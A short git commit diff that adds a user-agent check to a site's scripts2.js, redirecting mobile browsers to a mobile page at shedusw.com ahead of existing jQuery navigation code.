d770b45de9431c93af7a01865467d55a1601a14a
QIUYUEN <140587861+YUNEQIU@users.noreply.github.com>
2025-02-23 17:32:39 +0800

    Update scripts2.js

--- js/scripts2.js
+++ js/scripts2.js
@@ -1,3 +1,7 @@
+if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+    window.location.href = "https://shedusw.com/mobile.html";
+}
+
 $(function () {
   $("#nav-ul>li").mouseenter(
     function () {
